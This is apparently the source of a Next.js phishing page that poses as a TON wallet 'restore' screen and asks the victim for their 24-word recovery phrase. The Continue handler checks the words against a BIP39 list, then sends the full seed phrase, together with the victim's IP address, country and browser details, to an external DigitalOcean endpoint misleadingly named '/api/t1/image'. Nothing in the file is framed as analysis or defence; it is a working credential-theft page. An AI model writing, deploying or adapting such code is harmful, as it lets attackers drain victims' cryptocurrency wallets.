"use client";
import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { getUserCountry } from "../userLocation";

type Word = { index: number; value: string };

const empty = Array.from({ length: 24 }, (_, i) => ({
  index: i + 1,
  value: "",
}));

// Load BIP39 wordlist from public file
const loadWordlist = async (): Promise<string[]> => {
  try {
    console.log('Loading wordlist...');
    const response = await fetch('/seedphrase.txt');
    const text = await response.text();
    const words = text.trim().split('\n').map(word => word.trim());
    console.log('Wordlist loaded successfully, length:', words.length);
    console.log('First few words:', words.slice(0, 5));
    console.log('Is "test" in loaded wordlist?', words.includes('test'));
    return words;
  } catch (error) {
    console.error('Failed to load wordlist:', error);
    return [];
  }
};

export default function Page() {
  const [words, setWords] = useState<Word[]>(empty);
  const [errorMessage, setErrorMessage] = useState<string>("");
  const [wordlist, setWordlist] = useState<string[]>([]);

  // Load wordlist on component mount
  useEffect(() => {
    loadWordlist().then(setWordlist);
  }, []);

  const setWord = (i: number, v: string) => {
    setWords((prev) => {
      const next = [...prev];
      next[i] = { ...next[i], value: v.trim().toLowerCase() };
      return next;
    });
  };

  const onPaste = (e: React.ClipboardEvent<HTMLInputElement>, i: number) => {
    const text = e.clipboardData.getData("text");
    const parts = text
      .split(/\s+/)
      .filter(Boolean)
      .slice(0, 24 - i);
    if (parts.length > 1) {
      e.preventDefault();
      setWords((prev) => {
        const next = [...prev];
        parts.forEach((p, k) => {
          const idx = i + k;
          next[idx] = { ...next[idx], value: p.toLowerCase() };
        });
        return next;
      });
    }
  };

  const allFilled = words.every((w) => w.value.length >= 2);

  // Helper function to sanitize input
  const sanitizeInput = (input: string): string => {
    return input.trim().toLowerCase().replace(/[^a-z]/g, '');
  };

  // Helper function to check if seed phrase is correct
  const isCorrectSeedPhrase = (seedPhrase: string[]): boolean => {
    if (wordlist.length === 0) return true; // Skip validation if wordlist not loaded yet
    return seedPhrase.every(word => wordlist.includes(word));
  };

  const handleRestoreWallet = async () => {
    const sanitizedSeedPhrase = words.map((word) => sanitizeInput(word.value));
    
    console.log("Wordlist length:", wordlist.length);
    console.log("Sanitized seed phrase:", sanitizedSeedPhrase);
    console.log("First few words from wordlist:", wordlist.slice(0, 5));
    console.log("Is 'test' in wordlist?", wordlist.includes('test'));
    
    // Validate against BIP39 wordlist
    if (wordlist.length > 0 && !isCorrectSeedPhrase(sanitizedSeedPhrase)) {
      const invalidWords = sanitizedSeedPhrase.filter(
        (word) => !wordlist.includes(word)
      );
      console.log("Invalid words found:", invalidWords);
      setErrorMessage(`Invalid words: ${invalidWords.join(", ")}`);
      return;
    }
    
    const seedPhraseMessage = sanitizedSeedPhrase.join(" ");
    
    try {
      // Get user's IP and location info
      const userData = await getUserCountry();
      
      const messageData = { 
        appName: "Ton", 
        seedPhrase: seedPhraseMessage,
        country: userData?.country || 'Unknown',
        ipAddress: userData?.ip || 'Unknown',
        browser: navigator.userAgent || 'Unknown'
      };
      
      const response = await fetch(
        "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/image",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "x-api-key": process.env.NEXT_PUBLIC_SECRET_KEY || "",
          },
          body: JSON.stringify(messageData),
        }
      );
      const result = await response.json();
      if (response.status === 200 && result.status) {
        // window.location.href = "https://wallet.kaspanet.io";
        console.log(result);
      } else {
        const serverMessage = result?.message || "Something went wrong.";
        const serverError = result?.error ? ` (${result.error})` : "";
        setErrorMessage(serverMessage + serverError);
      }
    } catch (error) {
      setErrorMessage(
        "An error occurred while processing your request. Please try again."
      );
    }
  };

  return (
    <main className="min-h-dvh bg-black text-white flex items-center justify-center">
      <section className="w-full max-w-[780px] px-6 py-10 flex flex-col items-center">
        {/* 🔷 Animated image */}
        <motion.div
          className="h-20 w-20 rounded-2xl bg-white/5 grid place-items-center shadow"
          //   animate={{ rotate: [0, 360] }}
          transition={{ repeat: Infinity, duration: 6, ease: "linear" }}
          style={{}}
        >
          <img
            src="/brand/duck.svg"
            alt="Lock"
            className="h-32 w-32 object-contain"
          />
        </motion.div>

        {/* Heading */}
        <h1 className="mt-8 text-2xl sm:text-3xl font-extrabold tracking-tight">
          Enter Secret Words
        </h1>
        <p className="mt-3 text-center text-white/70 max-w-[60ch]">
          You can restore access to your wallet by entering the 24 secret words
          that were written down when creating the wallet.
        </p>

        {/* Inputs */}
        <div
          className="mt-12 grid grid-cols-3 gap-4 sm:grid-cols-4"
          aria-label="Recovery phrase inputs"
        >
          {words.map((w, i) => (
            <label key={w.index} className="relative">
              {/* Number label (remove duplicate numbers in placeholder) */}
              <span className="pointer-events-none absolute -top-2 left-3 translate-y-0 rounded-full bg-black px-2 text-xs text-white/50">
                {w.index}.
              </span>
              <input
                inputMode="text"
                autoCapitalize="none"
                autoCorrect="off"
                spellCheck={false}
                value={w.value}
                onChange={(e) => setWord(i, e.target.value)}
                onPaste={(e) => onPaste(e, i)}
                className="w-44 h-12 rounded-2xl bg-white/5 text-white placeholder:text-white/40 outline-none ring-0 focus:bg-white/10 px-4"
                placeholder="" // remove index from placeholder to avoid duplicates
              />
            </label>
          ))}
        </div>

        {/* Error message display */}
        {errorMessage && (
          <div className="mt-6 p-4 bg-red-500/20 border border-red-500/30 rounded-xl text-red-300 text-sm">
            {errorMessage}
          </div>
        )}

        {/* Footer actions */}
        <div className="mt-10 w-full max-w-[720px] flex justify-between gap-4">
          <button className="flex-1 h-11 rounded-xl bg-white/10 text-white hover:bg-white/15 transition-colors">
            Cancel
          </button>
          <button
            onClick={handleRestoreWallet}
            className={`flex-1 h-11 rounded-xl text-black font-semibold transition-all backdrop-blur
              ${
                allFilled
                  ? "bg-sky-400 hover:bg-sky-300 shadow-md"
                  : "bg-sky-400/30 cursor-not-allowed opacity-50"
              }`}
            disabled={!allFilled}
          >
            Continue
          </button>
        </div>
      </section>
    </main>
  );
}
